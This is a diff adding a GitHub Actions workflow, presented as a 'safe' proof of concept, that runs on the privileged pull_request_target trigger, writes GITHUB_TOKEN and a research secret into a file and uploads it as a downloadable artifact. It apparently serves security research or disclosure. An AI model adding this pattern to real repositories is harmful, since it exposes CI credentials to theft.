@@ -1,0 +1,39 @@
+name: SAFE PoC - Secret Exposure Demo (no external exfil)
+
+# Use pull_request_target so the workflow runs in the target repo context (high privilege)
+on:
+  pull_request_target:
+    branches: [ main ]
+
+permissions:
+  # least privilege for this PoC job except we want to show tokens exist; do not give write perms
+  contents: read
+
+jobs:
+  show-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show workflow context (for debugging)
+        run: |
+          echo "EVENT_TYPE=${{ github.event_name }}" > poc-info.txt
+          echo "REF=${{ github.ref }}" >> poc-info.txt
+          echo "PR_NUMBER=${{ github.event.pull_request.number || 'none' }}" >> poc-info.txt
+
+      - name: Save secrets into artifact (SAFE PoC)
+        run: |
+          # WARNING: This file will contain secrets and will be uploaded as an artifact
+          # Only repo collaborators and maintainers can download artifacts.
+          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" > exposed-secrets.txt || true
+          echo "RESEARCH_SECRET=${{ secrets.RESEARCH_SECRET }}" >> exposed-secrets.txt || true
+          # Prevent accidental printing of full secrets to logs (GitHub will mask secrets in logs).
+          # We still write the values into the artifact file for maintainers to inspect.
+          ls -l exposed-secrets.txt >> poc-info.txt
+
+      - name: Upload PoC artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: poc-exposed-secrets
+          path: |
+            exposed-secrets.txt
+            poc-info.txt
+          retention-days: 1
